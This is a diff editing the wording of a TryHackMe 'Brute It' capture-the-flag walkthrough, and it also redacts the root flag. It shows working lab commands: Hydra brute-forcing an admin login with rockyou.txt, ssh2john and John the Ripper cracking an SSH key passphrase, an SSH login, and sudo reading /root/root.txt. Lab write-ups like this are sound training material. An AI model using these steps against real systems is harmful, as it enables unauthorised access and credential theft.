@@ -125,7 +125,7 @@ Now that we have a potentially valid username,  all we need now is to find the m
 
 We'll do that using Hydra.  It is a nice brute forcing tool. It is fast, easy to use and well documented.  
 
-The process off brute forcing is simple.  The tool is going to try to login using the now known `admin` user in combination with a wordlist.  In this case I use `rockyou.txt` as my dictionary.
+The process of brute forcing is simple.  The tool is going to try to login using the now known `admin` user in combination with a wordlist.  In this case we are going to use `rockyou.txt` as the password dictionary.
 
 ``` ❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.235.217 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V
 
@@ -171,7 +171,7 @@ Bingo! The valid credentials are brute-forced.
 
 ---
 
-Let's go back to the web page to enter our valid credentials.
+Let's go back to the login web page to enter our new credentials.
 
 ![5](./_attachment/THM_Brute-It_id_rsa.png)
 
@@ -180,9 +180,9 @@ Let's go back to the web page to enter our valid credentials.
 ## Crack the Hash
 
 Back to the terminal!
-The `id_rsa` is a **Private Key** file.  These files are used as credentials to connect to **SSH** servers.  The **password** is encrypted in the file.  To extract it, we are going to ***Crack the Hash*** with `JohnTheRipper`.
+The `id_rsa` is a **Private Key** file.  Those files are used as credentials to connect to **SSH** services.  The **password** is encrypted in the file.  To extract it, we are going to ***Crack the Hash*** with `JohnTheRipper`.
 
-First, let's create an **hash file** from `id_rsa`. I used a Python script named `ssh2john.py`.  When done, let's start John and wait while he does his business:
+First, let's create the **hash file** from `id_rsa`. We can use a Python script named `ssh2john.py`.  When done, let's start John and let `John` do his business:
 
 ``` ❯ ssh2john id_rsa > id_rsa.hash
 
@@ -205,17 +205,17 @@ Session completed.
 We got a match!
 The **password** is : `rockinroll`
 
-We want to give us ownership of the id_rsa key by changing its **file permission**:
+We nee to give us ownership of the id_rsa key to be able to use it ourself.  To change the **file permission**:
 
 ``` chmod 400 id_rsa
 ```
 
 ![6](./_attachment/THM_Brute-It_id_rsa-file-perm.png)
-We can see now that `id_rsa` is read-only and for a single user, me.
+We can check with `ls -la` that `id_rsa` is now read-only and owned by a single user, me.
 
 ## PORT 22 - SSH - OpenSSH 7.6p1
 
-Now, it is time to use everything we have gathered so far and connect to the target using **username** `john` on SSH:
+Now, it is time to use everything we have gathered so far and connect to the target using **username** `john` on the previously discovered SSH server:
 
 ``` ❯ ssh -i id_rsa john@bruteit.thm
 The authenticity of host 'bruteit.thm (10.10.150.236)' can't be established.
@@ -254,7 +254,7 @@ user.txt
 
 ## Now let's get root
 
-Let's check what command `john` can run as root:
+Let's check what `john` is having permission to run as root using `sudo`:
 
 ``` john@bruteit:~$ sudo -l
 Matching Defaults entries for john on bruteit:
@@ -267,7 +267,7 @@ User john may run the following commands on bruteit:
 `john` can run `cat` as **root** using `sudo`.  Let's `cat` the `root.txt` flag:
 
 ``` john@bruteit:~$ sudo cat /root/root.txt
-THM{pr1v1l3g3_3sc4l4t10n}
+THM{ZZXXXZZXXXZZXXXZZXXXZZXXXZZXXX}
 john@bruteit:~$
 ```
 
